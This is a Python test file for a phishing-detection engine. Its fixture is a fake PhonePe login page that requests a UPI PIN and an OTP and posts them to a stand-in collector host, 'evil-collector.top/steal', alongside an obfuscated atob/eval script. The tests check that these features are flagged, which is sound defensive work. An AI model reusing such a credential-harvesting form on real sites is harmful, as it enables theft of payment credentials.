"""Offline tests for the behavioural phishing-tell engine (no network)."""
from app.services import behaviour
from app.services.fetcher import FetchResult


def _result(html, final_url="http://phonepe-login.xyz/pay", forms=None):
    return FetchResult(url=final_url, final_url=final_url, html=html, ok=True,
                       forms=forms or [])


PHISH_HTML = """
<html><head><title>PhonePe Login</title></head><body>
<p>Please enter your UPI PIN and enter OTP to verify your account.</p>
<form action="https://evil-collector.top/steal" method="post">
  <input name="upi_pin" type="password">
  <input name="otp" type="text">
</form>
<script>var x = atob("ZXZpbA=="); eval(x); document.write("gotcha");</script>
</body></html>
"""


def test_flags_credential_fields_and_cross_domain_and_obfuscation():
    forms = [{
        "action": "https://evil-collector.top/steal", "method": "post",
        "inputs": [{"name": "upi_pin", "type": "password"}, {"name": "otp", "type": "text"}],
    }]
    signals = behaviour.analyze_behaviour(_result(PHISH_HTML, forms=forms))
    names = {s.name for s in signals}
    assert "credential_input_fields" in names
    assert "cross_domain_form_action" in names
    assert "obfuscated_js" in names
    assert "credential_harvesting_text" in names
    # UPI PIN / OTP presence should carry the heavier credential weight.
    cred = next(s for s in signals if s.name == "credential_input_fields")
    assert cred.weight >= 0.4


def test_same_domain_form_not_flagged_cross_domain():
    forms = [{"action": "/submit", "method": "post",
              "inputs": [{"name": "email", "type": "text"}]}]
    signals = behaviour.analyze_behaviour(_result("<form></form>", forms=forms))
    assert "cross_domain_form_action" not in {s.name for s in signals}


def test_long_base64_blob_flagged():
    blob = "A" * 200
    html = f"<script>var p='{blob}';</script>"
    signals = behaviour.analyze_behaviour(_result(html))
    assert "obfuscated_js" in {s.name for s in signals}


def test_empty_html_returns_empty():
    assert behaviour.analyze_behaviour(_result("")) == []
    assert behaviour.analyze_behaviour(None) == []
